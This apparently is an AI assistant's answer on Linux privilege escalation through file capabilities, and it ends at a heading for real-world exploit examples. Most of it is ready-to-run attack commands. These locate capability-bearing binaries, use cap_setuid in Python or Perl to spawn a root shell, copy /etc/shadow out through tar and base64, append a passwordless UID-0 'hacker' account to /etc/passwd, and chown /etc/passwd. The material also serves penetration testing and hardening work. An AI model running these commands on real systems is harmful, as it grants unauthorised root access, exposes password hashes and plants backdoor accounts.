Great topic! Here's how privilege escalation via Linux capabilities works:
What Are Linux Capabilities?

Capabilities split root privileges into smaller, distinct units that can be assigned to executables without giving full root access.
Finding Binaries with Capabilities:
bash

# Search entire system
getcap -r / 2>/dev/null

# Search specific directory
getcap -r /usr/bin 2>/dev/null

# Check specific file
getcap /usr/bin/python3

Common Dangerous Capabilities:
CAP_SETUID - Change UID (become root)
bash

# If Python has cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If Perl has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

CAP_DAC_READ_SEARCH - Read any file
bash

# Read /etc/shadow or other protected files
tar -czf /tmp/shadow.tar.gz /etc/shadow
cat /tmp/shadow.tar.gz | base64

CAP_DAC_OVERRIDE - Bypass file permission checks
bash

# Write to any file
python3 -c 'open("/etc/passwd","a").write("hacker:x:0:0::/root:/bin/bash\n")'

CAP_CHOWN - Change file ownership
bash

# Take ownership of /etc/passwd
python -c 'import os; os.chown("/etc/passwd", 1000, 1000)'

Real-World Exploit Examples:
Python with cap_setuid+ep:
